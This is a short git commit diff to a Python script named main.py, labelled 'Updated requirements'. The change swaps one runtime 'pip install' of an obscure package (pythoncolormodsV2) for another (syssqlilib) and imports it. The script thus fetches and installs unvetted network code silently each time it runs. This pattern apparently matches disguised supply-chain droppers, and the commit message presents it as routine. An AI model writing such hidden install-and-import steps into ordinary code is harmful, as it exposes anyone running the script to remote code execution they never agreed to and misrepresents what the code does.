22a465c3314e32da502505bb2f3dc6f43afc23de
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-15 18:54:53 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolormodsV2")
-import pythoncolormodsV2
+os.system("pip install syssqlilib")
+import syssqlilib
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
